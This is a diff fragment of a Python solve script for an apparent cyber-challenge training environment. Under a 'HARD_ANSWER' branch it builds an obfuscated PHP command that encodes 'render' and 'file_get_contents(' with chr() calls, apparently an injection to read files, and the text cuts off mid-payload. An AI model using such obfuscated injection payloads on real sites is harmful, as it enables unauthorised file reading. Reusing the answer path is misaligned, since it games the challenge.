@@ -24,7 +24,8 @@ async def main():
     result = await client.step(CybergymIncidentsOctAction(cmd="cat challenge.txt"))
     assert "submit" in result.observation.output.lower(), "challenge text missing"
     if HARD_ANSWER:
-        import json as _json
+        result = await client.reset(seed=2, split="train", index=5)
+        print("hard task:", result.observation.task_id)
         php = ("cd www && php -r '$_GET[chr(114).chr(101).chr(110).chr(100).chr(101).chr(114)]"
                "=chr(102).chr(105).chr(108).chr(101).chr(95).chr(103).chr(101).chr(116).chr(95)"
                ".chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(115).chr(40)"
